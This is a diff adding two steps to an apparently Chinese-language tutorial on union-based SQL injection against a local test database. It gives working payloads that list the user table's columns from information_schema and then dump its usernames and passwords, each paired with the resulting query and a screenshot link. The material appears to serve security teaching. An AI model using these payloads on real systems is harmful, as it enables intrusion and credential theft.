@@ -88,3 +88,23 @@ select * from user where username='1' union all select 1,database(),3,4,5,6,7,8,
 select * from user where username='1' union all select 1,database(),3,4,5,6,7,8,9,10,group_concat(table_name),12 from information_schema.tables where table_schema = 'test_fastapi' #'
 ```
 ![image](https://github.com/498946975/Security/blob/master/images/sql_21.png)
+### 8、联合注入的过程6:
+### 使用column_name，查询某一个表的，所有列的名称
+#### 8.1 通过以上的数据，可以查到，有个表叫user，下面查询，user这个表的所有列的名称
+```sql
+1' union all select 1,database(),3,4,5,6,7,8,9,10,column_name,12  from information_schema.columns where table_schema = 'test_fastapi' and table_name = 'user' #
+```
+```sql
+select * from user where username='1' union all select 1,database(),3,4,5,6,7,8,9,10,column_name,12 from information_schema.columns where table_schema = 'test_fastapi' and table_name = 'user' #'
+```
+![image](https://github.com/498946975/Security/blob/master/images/sql_24.png)
+
+### 9、联合注入的过程7:
+### 查询user表的用户名和密码
+```sql
+1' union all select 1,username,3,4,5,6,7,8,9,10,pwd,12 from user #
+```
+```sql
+select * from user where username='1' union all select 1,username,3,4,5,6,7,8,9,10,pwd,12 from user #'
+```
+![image](https://github.com/498946975/Security/blob/master/images/sql_25.png)
